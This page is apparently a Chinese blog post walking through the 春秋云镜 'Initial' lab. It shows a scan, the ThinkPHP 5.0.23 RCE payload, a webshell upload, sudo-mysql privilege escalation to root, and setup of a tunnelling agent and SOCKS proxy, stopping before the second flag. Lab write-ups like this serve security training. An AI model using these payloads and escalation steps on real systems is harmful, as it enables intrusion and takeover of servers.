@@ -1,0 +1,734 @@
+<!doctype html><html lang=zh-cn><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>春秋云镜Initial - Twansh's blog</title><link rel=icon href=/logo.png><script>(function(){localStorage.removeItem("flavor-theme");var t=window.matchMedia("(prefers-color-scheme: dark)"),e=sessionStorage.getItem("flavor-theme-override");if(e==="light"||e==="dark"){document.documentElement.setAttribute("data-theme",e);return}document.documentElement.setAttribute("data-theme",t.matches?"dark":"light")})()</script><link rel=preload as=font type=font/woff2 href=/fonts/tsanger-jinkai02/20307ec77575b65807a8b0c5b7201f43.woff2 crossorigin><link rel=preload as=style href=/fonts/tsanger-jinkai02/result.css onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/fonts/tsanger-jinkai02/result.css></noscript><link rel=stylesheet href=/scss/main.min.f9483bf4231821718c79757993df7674f414a796ac0bd206f89cc6c81e39cb27.css><meta name=description content="最近发生了挺多烦心事，哎，希望能在未来逐一解决吧"><meta name=author content="Twansh"><meta name=robots content="index,follow,max-image-preview:large"><meta name=keywords content="Cyberspace Security,CTF,Web Security,Penetration Testing,Offensive,春秋云镜,内网渗透"><link rel=canonical href=https://3a0.top/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial/><meta property="og:site_name" content="Twansh's blog"><meta property="og:title" content="春秋云镜Initial - Twansh's blog"><meta property="og:description" content="最近发生了挺多烦心事，哎，希望能在未来逐一解决吧"><meta property="og:type" content="article"><meta property="og:url" content="https://3a0.top/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial/"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://3a0.top/logo.png"><meta property="og:image:alt" content="春秋云镜Initial"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="春秋云镜Initial - Twansh's blog"><meta name=twitter:description content="最近发生了挺多烦心事，哎，希望能在未来逐一解决吧"><meta name=twitter:image content="https://3a0.top/logo.png"><meta property="article:published_time" content="2025-11-05T19:16:54Z"><meta property="article:modified_time" content="2025-11-05T19:16:54Z"><meta property="article:section" content="Offensive"><meta property="article:tag" content="春秋云镜"><meta property="article:tag" content="内网渗透"><script type=application/ld+json>{"@context":"https://schema.org","@graph":[{"@id":"https://3a0.top/#website","@type":"WebSite","description":"Cyberspace Security / CTF / Web 安全，记录学习和生活。","inLanguage":"zh-cn","name":"Twansh's blog","url":"https://3a0.top/"},{"@id":"https://3a0.top/about/#author","@type":"Person","email":"eminemgcxwlp@gmail.com","name":"Twansh","sameAs":["https://github.com/GCXWLP"],"url":"https://3a0.top/about/"},{"@id":"https://3a0.top/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial/#article","@type":"BlogPosting","author":{"@id":"https://3a0.top/about/#author"},"dateModified":"2025-11-05T19:16:54Z","datePublished":"2025-11-05T19:16:54Z","description":"最近发生了挺多烦心事，哎，希望能在未来逐一解决吧","headline":"春秋云镜Initial","image":["https://3a0.top/logo.png"],"inLanguage":"zh-cn","isPartOf":{"@id":"https://3a0.top/#website"},"keywords":["Offensive","春秋云镜","内网渗透"],"mainEntityOfPage":"https://3a0.top/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial/","url":"https://3a0.top/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial/"},{"@id":"https://3a0.top/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial/#breadcrumb","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://3a0.top/","name":"Home","position":1},{"@type":"ListItem","item":"https://3a0.top/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial/","name":"春秋云镜Initial","position":2}]}]}</script></head><body><nav class=navbar id=navbar><div class=navbar__inner><a class=navbar__brand href=/><span>Twansh's blog</span></a><div class=navbar__right><ul class=navbar__links id=nav-links><li><a href=/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<span>Links</span></a></li><li><a href=/travel/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
+<span>Travel</span></a></li></ul><button class=navbar__btn id=search-btn type=button aria-label=Search>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+</button>
+<button class=navbar__btn id=theme-toggle type=button aria-label="Toggle theme">
+<svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+<svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+</button>
+<button class="navbar__btn navbar__hamburger" id=hamburger type=button aria-label=Menu>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></nav><div class=site-content><div class=post-layout><article class="post-layout__content post-single"><header class=post-single__header><div class=post-single__meta><time datetime=2025-11-05 data-pagefind-meta=date[datetime]>Nov 05, 2025</time>
+<span class=sep>·</span>
+<span>17 min read</span>
+<span class=sep>·</span>
+<span>3555 words</span>
+<span class=sep>·</span>
+<a href=/categories/offensive/ class=post-single__category data-pagefind-filter=category>Offensive</a></div><h1 class=post-single__title data-pagefind-meta=title>春秋云镜Initial</h1></header><div class=article-content data-pagefind-body><h2 id=flag1>flag1</h2><p>fscan起手</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>E:<span class=se>\C</span>TFFIT<span class=se>\O</span>NE-FOX集成工具箱_V8公开版_by狐狸<span class=se>\g</span>ui_scan<span class=se>\f</span>scan&gt;fscan -h 39.99.138.60
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   ___                              _
+</span></span><span class=line><span class=cl>  / _ <span class=se>\ </span>    ___  ___ _ __ __ _  ___<span class=p>|</span> <span class=p>|</span> __
+</span></span><span class=line><span class=cl> / /_<span class=se>\/</span>____/ __<span class=p>|</span>/ __<span class=p>|</span> <span class=err>&#39;</span>__/ _<span class=sb>`</span> <span class=p>|</span>/ __<span class=p>|</span> <span class=p>|</span>/ /
+</span></span><span class=line><span class=cl>/ /_<span class=se>\\</span>_____<span class=se>\_</span>_ <span class=se>\ </span><span class=o>(</span>__<span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=p>|</span> <span class=p>|</span> <span class=o>(</span>__<span class=p>|</span>   &lt;
+</span></span><span class=line><span class=cl><span class=se>\_</span>___/     <span class=p>|</span>___/<span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>  <span class=se>\_</span>_,_<span class=p>|</span><span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span><span class=se>\_\
+</span></span></span><span class=line><span class=cl>                     fscan version: 1.8.3
+</span></span><span class=line><span class=cl>start infoscan
+</span></span><span class=line><span class=cl>39.99.138.60:80 open
+</span></span><span class=line><span class=cl>39.99.138.60:22 open
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> alive ports len is: <span class=m>2</span>
+</span></span><span class=line><span class=cl>start vulscan
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://39.99.138.60       code:200 len:5578   title:Bootstrap Material Admin
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> PocScan http://39.99.138.60 poc-yaml-thinkphp5023-method-rce poc1
+</span></span><span class=line><span class=cl>已完成 2/2
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 扫描结束,耗时: 46.6863044s
+</span></span></code></pre></div><p>存在thinkphp的某个rce漏洞，利用thinkphp框架漏洞工具</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>检测所有漏洞中......
+</span></span><span class=line><span class=cl><span class=o>=====================================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>2</span> RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 5.0 RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 5.0.10 construct RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 5.0.22/5.1.29 RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 存在ThinkPHP 5.0.23 RCE
+</span></span><span class=line><span class=cl>Payload: http://39.99.138.60//?s<span class=o>=</span>captcha<span class=p>&amp;</span><span class=nv>test</span><span class=o>=</span>-1 Post: <span class=nv>_method</span><span class=o>=</span>__construct<span class=p>&amp;</span>filter<span class=o>[]=</span>phpinfo<span class=p>&amp;</span><span class=nv>method</span><span class=o>=</span>get<span class=p>&amp;</span>server<span class=o>[</span>REQUEST_METHOD<span class=o>]=</span><span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 5.0.24-5.1.30 RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>5</span> 文件包含漏洞
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>5</span> show-id RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>5</span> method filter RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>5</span> session include
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>5</span> SQL注入漏洞 <span class=o>&amp;&amp;</span> 敏感信息泄露
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 5.x 数据库信息泄露
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 5.x 日志泄露
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 3.x RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 3.x 日志泄露
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 3.x Log RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 6.x 日志泄露
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>6</span> 文件包含漏洞
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>6</span> session文件写入
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP catch 命令执行漏洞
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP check-code sql注入漏洞
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP multi sql注入 <span class=o>&amp;&amp;</span> 信息泄露漏洞
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP orderid sql注入
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP update sql注入
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP recent_xff sql注入
+</span></span></code></pre></div><p>探测出来之后点击getshell之后，就会帮我们上传对应的木马，用webshell管理工具连接即可</p><p><img class=article-content-image src=/image/Initial.png fetchpriority=high decoding=async alt="alt text"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>检测所有漏洞中......
+</span></span><span class=line><span class=cl><span class=o>=====================================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>2</span> RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 5.0 RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 5.0.10 construct RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 5.0.22/5.1.29 RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 存在ThinkPHP 5.0.23 RCE
+</span></span><span class=line><span class=cl>Payload: http://39.99.138.60//?s<span class=o>=</span>captcha<span class=p>&amp;</span><span class=nv>test</span><span class=o>=</span>-1 Post: <span class=nv>_method</span><span class=o>=</span>__construct<span class=p>&amp;</span>filter<span class=o>[]=</span>phpinfo<span class=p>&amp;</span><span class=nv>method</span><span class=o>=</span>get<span class=p>&amp;</span>server<span class=o>[</span>REQUEST_METHOD<span class=o>]=</span><span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 5.0.24-5.1.30 RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>5</span> 文件包含漏洞
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>5</span> show-id RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>5</span> method filter RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>5</span> session include
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>5</span> SQL注入漏洞 <span class=o>&amp;&amp;</span> 敏感信息泄露
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 5.x 数据库信息泄露
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 5.x 日志泄露
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 3.x RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 3.x 日志泄露
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 3.x Log RCE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP 6.x 日志泄露
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>6</span> 文件包含漏洞
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP <span class=m>6</span> session文件写入
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP catch 命令执行漏洞
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP check-code sql注入漏洞
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP multi sql注入 <span class=o>&amp;&amp;</span> 信息泄露漏洞
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP orderid sql注入
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP update sql注入
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> 不存在ThinkPHP recent_xff sql注入
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> http://39.99.138.60//peiqi.php   Pass:peiqi
+</span></span></code></pre></div><p>看到上传的木马peiqi.php,密码是peiqi</p><p>使用哥斯拉连上去<br><img class=article-content-image src=/image/Initial1.png loading=lazy decoding=async alt="alt text"></p><p>进入之后即可进行命令知悉<br><img class=article-content-image src=/image/Initial2.png loading=lazy decoding=async alt="alt text"></p><p>打群友靶机的经验告诉我，这个就是个www-data权限，是远远不够的，需要进行提权</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>currentDir:/var/www/html/
+</span></span><span class=line><span class=cl>fileRoot:<span class=o>[</span>/<span class=o>]</span>
+</span></span><span class=line><span class=cl>currentUser:www-data
+</span></span><span class=line><span class=cl>osInfo:Linux ubuntu-web01 5.4.0-110-generic <span class=c1>#124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/var/www/html/ &gt;id
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span><span class=line><span class=cl>/var/www/html/ &gt;sudo -l
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> www-data on ubuntu-web01:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User www-data may run the following commands on ubuntu-web01:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /usr/bin/mysql
+</span></span><span class=line><span class=cl>/var/www/html/ &gt;
+</span></span></code></pre></div><p>sudo -l出来，mysql可以利用，参考提权宝典<br><a href=https://gtfobins.github.io/gtfobins/mysql/>https://gtfobins.github.io/gtfobins/mysql/</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/var/www/html/ &gt;sudo mysql -e <span class=s1>&#39;\! /bin/sh&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/var/www/html/ &gt;
+</span></span></code></pre></div><p>注意到这里毫无回显，其实是因为这里并不是一个交互式shell，所以无法切换到root的shell，但是我们依然可以读取root的文件</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/var/www/html/ &gt;sudo mysql -e <span class=s1>&#39;\! tac /root/flag/flag01.txt&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>flag01: flag<span class=o>{</span>60b53231-
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  
+</span></span><span class=line><span class=cl> ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ 
+</span></span><span class=line><span class=cl>  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██
+</span></span><span class=line><span class=cl>   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████
+</span></span><span class=line><span class=cl>  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         
+</span></span><span class=line><span class=cl> ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ 
+</span></span><span class=line><span class=cl>░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██
+</span></span><span class=line><span class=cl> ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████
+</span></span></code></pre></div><p>第一部分flag，get!</p><h2 id=flag2>flag2</h2><p>flag2是在内网的机器中的，我们需要通过哥斯拉把fscan和内网代理搭建的工具传上去</p><p><img class=article-content-image src=/image/Initial3.png loading=lazy decoding=async alt="alt text"></p><p>注意这里fscan是通过大文件上传的方式上传上去的，普通的上传会失败</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/tmp &gt;ls
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>fscan
+</span></span><span class=line><span class=cl>linux_x64_agent
+</span></span><span class=line><span class=cl>/tmp &gt;chmod +x fscan
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/tmp &gt;chmod +x linux_x64_agent
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/tmp &gt;
+</span></span></code></pre></div><p>回到这里，给两个文件添加可执行权限</p><p>然后到vps上开启我们的服务(admin)端</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>linux_x64_admin -l <span class=m>1122</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting admin node on port <span class=m>1122</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    .-<span class=s1>&#39;)    .-&#39;</span><span class=o>)</span> _                  <span class=o>(</span><span class=s1>&#39;\ .-&#39;</span><span class=o>)</span> /<span class=s1>&#39;  (&#39;</span>-.      <span class=o>(</span><span class=s1>&#39;\ .-&#39;</span><span class=o>)</span> /<span class=s1>&#39;  (&#39;</span>-.                 
+</span></span><span class=line><span class=cl>   <span class=o>(</span> OO <span class=o>)</span>. <span class=o>(</span>  OO<span class=o>)</span> <span class=o>)</span>                  <span class=s1>&#39;.( OO ),&#39;</span> <span class=o>(</span> OO <span class=o>)</span>.-.   <span class=s1>&#39;.( OO ),&#39;</span> <span class=o>(</span> OO <span class=o>)</span>.-.             
+</span></span><span class=line><span class=cl>   <span class=o>(</span>_<span class=o>)</span>---<span class=se>\_</span><span class=o>)</span>/     <span class=s1>&#39;._  .-&#39;</span><span class=o>)</span>,-----. ,--./  .--.   / . --. /,--./  .--.   / . --. /  ,--.   ,--.
+</span></span><span class=line><span class=cl>   /    _ <span class=p>|</span> <span class=p>|</span><span class=s1>&#39;--...__)( OO&#39;</span>  .-.  <span class=s1>&#39;|      |  |   | \-.  \ |      |  |   | \-.  \    \  &#39;</span>.<span class=s1>&#39;  / 
+</span></span></span><span class=line><span class=cl><span class=s1>   \  :&#39;</span> <span class=s1>&#39;. &#39;</span>--.  .--<span class=s1>&#39;/   |  | |  ||  |   |  |,.-&#39;</span>-<span class=s1>&#39;  |  ||  |   |  |,.-&#39;</span>-<span class=s1>&#39;  |  | .-&#39;</span><span class=o>)</span>     /  
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;..&#39;&#39;&#39;</span>.<span class=o>)</span>   <span class=p>|</span>  <span class=p>|</span>   <span class=se>\_</span><span class=o>)</span> <span class=p>|</span>  <span class=p>|</span><span class=se>\|</span>  <span class=o>||</span>  <span class=p>|</span>.<span class=s1>&#39;.|  |_)\| |_.&#39;</span>  <span class=o>||</span>  <span class=p>|</span>.<span class=s1>&#39;.|  |_)\| |_.&#39;</span>  <span class=p>|</span><span class=o>(</span>OO  <span class=se>\ </span>  /   
+</span></span><span class=line><span class=cl>   .-._<span class=o>)</span>   <span class=se>\ </span>  <span class=p>|</span>  <span class=p>|</span>     <span class=se>\ </span><span class=p>|</span>  <span class=p>|</span> <span class=p>|</span>  <span class=o>||</span>         <span class=p>|</span>   <span class=p>|</span>  .-.  <span class=o>||</span>         <span class=p>|</span>   <span class=p>|</span>  .-.  <span class=p>|</span> <span class=p>|</span>   /  /<span class=se>\_</span>  
+</span></span><span class=line><span class=cl>   <span class=se>\ </span>      /   <span class=p>|</span>  <span class=p>|</span>      <span class=s1>&#39;&#39;</span>  <span class=s1>&#39;-&#39;</span>  <span class=s1>&#39;|   ,&#39;</span>.   <span class=p>|</span>   <span class=p>|</span>  <span class=p>|</span> <span class=p>|</span>  <span class=o>||</span>   ,<span class=s1>&#39;.   |   |  | |  | &#39;</span>-./  /.__<span class=o>)</span> 
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;-----&#39;</span>    <span class=s1>&#39;--&#39;</span>        <span class=s1>&#39;-----&#39;</span> <span class=s1>&#39;--&#39;</span>   <span class=s1>&#39;--&#39;</span>   <span class=s1>&#39;--&#39;</span> <span class=s1>&#39;--&#39;&#39;--&#39;</span>   <span class=s1>&#39;--&#39;</span>   <span class=s1>&#39;--&#39;</span> <span class=s1>&#39;--&#39;</span>   <span class=s1>&#39;--&#39;</span>      
+</span></span><span class=line><span class=cl>			            <span class=o>{</span> v2.2  Author:ph4ntom <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Waiting <span class=k>for</span> new connection...
+</span></span></code></pre></div><p>agent端就正常连接即可</p><p>服务端依旧搭建socks代理</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>admin<span class=o>)</span> &gt;&gt; use <span class=m>0</span> 
+</span></span><span class=line><span class=cl><span class=o>(</span>node 0<span class=o>)</span> &gt;&gt; socks <span class=m>1123</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying to listen on 0.0.0.0:1123......
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Waiting <span class=k>for</span> agent<span class=err>&#39;</span>s response......
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Socks start successfully!
+</span></span><span class=line><span class=cl><span class=o>(</span>node 0<span class=o>)</span> &gt;&gt; 
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>node 0<span class=o>)</span> &gt;&gt; shell
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Waiting <span class=k>for</span> response.....
+</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>734<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
+</span></span><span class=line><span class=cl>bash: no job control in this shell
+</span></span><span class=line><span class=cl>www-data@ubuntu-web01:/tmp$ whoami
+</span></span><span class=line><span class=cl>whoami
+</span></span><span class=line><span class=cl>www-data
+</span></span><span class=line><span class=cl>www-data@ubuntu-web01:/tmp$ 
+</span></span></code></pre></div><p>获取交互式shell，前面因为不是交互式shell而无法提权，这里可以进行提权</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@ubuntu-web01:/tmp$ sudo mysql -e <span class=s1>&#39;\! /bin/sh&#39;</span>
+</span></span><span class=line><span class=cl>sudo mysql -e <span class=s1>&#39;\! /bin/sh&#39;</span>
+</span></span><span class=line><span class=cl>whoami
+</span></span><span class=line><span class=cl>root
+</span></span></code></pre></div><p>得到了root权限</p><p>用script语句升级一下为一个较为完全的shell</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>script -qc /bin/bash /dev/null
+</span></span><span class=line><span class=cl>root@ubuntu-web01:/tmp# whoami
+</span></span><span class=line><span class=cl>whoami
+</span></span><span class=line><span class=cl>root
